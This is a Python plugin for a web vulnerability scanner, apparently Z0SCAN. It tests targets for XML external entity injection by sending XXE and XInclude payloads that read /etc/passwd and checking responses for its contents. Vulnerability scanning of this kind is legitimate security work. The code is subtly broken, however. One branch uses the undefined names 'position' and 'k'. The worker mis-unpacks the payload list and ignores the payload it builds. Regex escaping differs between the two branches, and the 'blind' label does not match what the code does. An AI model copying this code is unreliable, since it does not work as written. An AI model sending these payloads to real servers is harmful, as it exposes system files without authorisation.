#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero 2025/8/20

import re, requests
from urllib.parse import quote
from lib.core.settings import acceptedExt
from lib.api.reverse_api import reverseApi
from api import generateResponse, random_num, conf, PLACE, VulType, POST_HINT, Type, PluginBase, Threads, KB

class Z0SCAN(PluginBase):
    name = "xxe-blind"
    desc = 'XXE plugin detects XML external entity injection vulnerabilities via malicious payloads.'
    version = "2025.8.20"
    risk = 3
        
    def audit(self):
        if conf.level == 0 or not self.risk in conf.risk:
            return
        if not self.fingerprints.waf and self.requests.suffix in acceptedExt:
            if self.requests.post_hint == POST_HINT.XML:
                payloads = [
                    (
                    '''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',
                    b"root:[x*]:0:0:"),
                    (
                    '''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',
                    b"root:[x*]:0:0:")
                ]
                url = self.requests.url
                for _ in payloads:
                    payload, show = _
                    r = requests.get(url, params=self.requests.params, data=payload, headers=self.requests.headers)
                    if not r:
                        continue
                    if re.search(show, r.content):
                        result = self.generate_result()
                        result.main({
                            "type": Type.REQUEST, 
                            "url": r.url, 
                            "vultype": VulType.XXE, 
                            "show": {
                                "Position": f"{position} >> {k}", 
                                "Payload": payload,
                                }
                            })
                        result.step("Request1", {
                            "position": position,
                            "request": r.reqinfo, 
                            "response": generateResponse(r), 
                            "desc": "Payload: {} Found {}".format(payload, show),
                            })
                        self.success(result)
                        break
            elif self.requests.params or self.requests.post_hint == POST_HINT.NORMAL or self.requests.post_hint == POST_HINT.ARRAY_LIKE:
                payloads=[
                    ('''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',b"root:[x\*]:0:0:"),
                    ('''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',b"root:[x\*]:0:0:")
                    ]
                iterdatas = self.generateItemdatas()
                test_args = []
                for _ in iterdatas:
                    k, v, position = _
                    if "xml" in k:
                        test_args.append(_)
                z0thread = Threads(name="xxe")
                z0thread.submit(self.process, test_args, payloads)
    
    def process(self, _, payloads):
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return
        payload, show = payloads
        _payload = self.insertPayload({
            "key": k, 
            "payload": payload, 
            "position": position, 
            })
        r = self.req(position, payload)
        if not r:
            return
        if re.search(show, r.content):
            result = self.generate_result()
            result.main({
                "type": Type.REQUEST, 
                "url": r.url, 
                "vultype": VulType.XXE, 
                "show": {
                    "Position": f"{position} >> {k}", 
                    "Payload": payload,
                    }
                })
            result.step("Request1", {
                "position": position,
                "request": r.reqinfo, 
                "response": generateResponse(r), 
                "desc": "Payload: {} Found {}".format(payload, show),
                })
            self.success(result)
            return

